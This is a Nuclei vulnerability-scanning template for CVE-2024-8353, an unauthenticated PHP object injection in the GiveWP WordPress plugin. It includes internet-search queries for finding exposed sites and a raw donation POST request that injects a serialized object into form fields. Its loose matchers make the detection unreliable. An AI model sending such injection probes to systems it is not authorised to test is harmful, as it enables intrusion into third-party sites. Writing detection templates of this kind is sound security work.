id: CVE-2024-8353

info:
  name: GiveWP < 3.16.2 - PHP Object Injection
  author: nuclei-community
  severity: critical
  description: |
    The GiveWP plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.16.1 via the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. No POP chain is present in the vulnerable plugin, however one is present in WordPress core, which can lead to remote code execution when combined with certain plugins and themes.
  impact: |
    Unauthenticated attackers can inject PHP objects leading to potential remote code execution.
  remediation: |
    Update GiveWP to version 3.16.2 or later.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_givewp_rce.rb
    - https://vulncheck.com/xdb/2d719a4f5a4d
    - https://github.com/EQSTLab/CVE-2024-8353
    - https://github.com/0xb0mb3r/CVE-2024-8353-PoC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-8353
    cwe-id: CWE-502
    epss-score: 0.09172
    epss-percentile: 0.92359
    cpe: cpe:2.3:a:givewp:give:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: givewp
    product: give
    framework: wordpress
    shodan-query: "http.html:/wp-content/plugins/give/"
    fofa-query: "body=/wp-content/plugins/give/"
    publicwww-query: "/wp-content/plugins/give/"
  tags: cve,cve2024,wordpress,wp-plugin,give,php,object-injection,unauth,rce,intrusive

variables:
  payload: 'O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}'

http:
  - raw:
      - |
        POST /?post_type=give_forms&p=9 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=give_process_donation&give-form-id=9&give-form-hash={{rand_text_alpha(10)}}&give-price-id=0&give-amount=25&give_first=Test&give_last=User&give_email=test@example.com&give_title={{url_encode(payload)}}&card_address={{url_encode(payload)}}&give_purchase_key={{rand_text_alpha(32)}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - 'contains(body, "give") || contains(body, "donation") || contains(body, "form")'

      - type: word
        part: body
        words:
          - "Fatal error"
          - "Parse error" 
          - "Uncaught Error"
          - "object injection"
        condition: or
        negative: true
